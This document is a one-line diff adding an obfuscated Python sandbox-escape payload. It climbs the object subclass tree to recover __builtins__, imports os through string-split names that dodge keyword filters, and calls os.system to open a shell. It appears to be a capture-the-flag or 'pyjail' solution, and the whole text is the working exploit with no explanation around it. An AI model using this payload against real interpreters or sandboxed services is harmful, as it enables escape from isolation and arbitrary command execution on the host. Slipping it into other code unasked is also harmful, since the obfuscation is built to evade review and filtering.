@@ -1,0 +1,1 @@
+([x for x in().__class__.__base__.__subclasses__()if"cat"in x.__name__][0]()._module.__builtins__["__impor""t__"]("o""s")).__getattribute__("syste""m")("s""h")
